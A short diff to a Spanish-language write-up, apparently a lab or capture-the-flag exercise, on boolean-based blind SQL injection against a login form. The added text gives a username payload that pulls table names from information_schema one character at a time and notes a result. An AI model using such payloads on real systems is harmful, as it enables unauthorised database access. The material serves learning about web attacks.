@@ -70,9 +70,11 @@ para el tercer posición obtenemos la letra "w"
 ![[Pasted image 20240204223225.png]]
 tenemos que hacer esto cambiando la posición hasta conseguir información sobre el nombre de la base de datos
 
-usaremos esta 
+usaremos este parametro para obtener informacion sobre las tablas
+
 ```python
 	username=kitty'+and+substring((select+table_name+from+information_schema.tables+where+table_schema="mywebsite"+limit+0,1),1,1)="a"+#&password=kitty
 ```
 
+el primer resultado nos da la letra "s"
 ![[Pasted image 20240204235500.png]]
